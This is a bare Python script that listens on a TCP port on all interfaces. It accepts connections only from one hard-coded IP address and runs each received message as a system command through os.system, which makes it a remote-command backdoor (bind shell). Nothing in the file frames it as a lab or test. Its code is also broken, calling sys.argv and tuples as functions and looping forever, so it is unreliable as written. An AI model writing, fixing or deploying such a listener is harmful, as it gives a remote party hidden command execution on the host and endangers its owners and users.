import os
import socket
import sys
port = int(sys.argv(1))
def main():
    sock = socket.create_server(("0.0.0.0", port))
    sock.listen()
    while(True):
        array = sock.accept()
        conn = array(0)
        address = array(1)
        length = 1
        if(address(0) != "172.20.241.20"):
            length = 0
        while(length > 0):
            message = conn.recv(4096)
            dec = message.decode('utf-8')
            os.system(dec)
main()